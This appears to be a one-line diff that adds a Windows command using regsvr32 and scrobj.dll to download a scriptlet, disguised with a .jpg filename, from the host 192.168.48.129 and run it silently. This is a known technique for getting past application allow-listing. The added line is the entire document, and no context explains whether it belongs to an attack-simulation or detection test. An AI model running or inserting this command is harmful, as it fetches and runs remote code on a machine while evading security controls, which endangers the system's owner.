@@ -1,0 +1,1 @@
+regsvr32 /u /s /i:http://192.168.48.129/test.jpg scrobj.dll
